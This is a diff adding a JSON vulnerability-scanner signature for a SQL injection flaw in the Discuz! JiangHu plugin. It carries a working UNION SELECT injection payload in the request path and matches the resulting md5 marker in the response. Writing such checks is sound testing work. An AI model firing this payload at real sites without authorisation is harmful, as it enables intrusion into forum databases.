@@ -1,0 +1,23 @@
+{
+  "cms": "discuz",
+  "version": "",
+  "author": "wolf",
+  "desc": "Discuz! JiangHu Plugin 存在SQL注入漏洞",
+  "tags": [
+    "SQL注入"
+  ],
+  "refer": [
+    "",
+    ""
+  ],
+  "request": {
+    "path": "/forummission.php?index=show&id=24%20and+1=2+union+select+1,2,md5(700),4,5,6,7,8,9,10,11--",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "e5841df2166dd424a57127423d276bbe"
+  }
+}
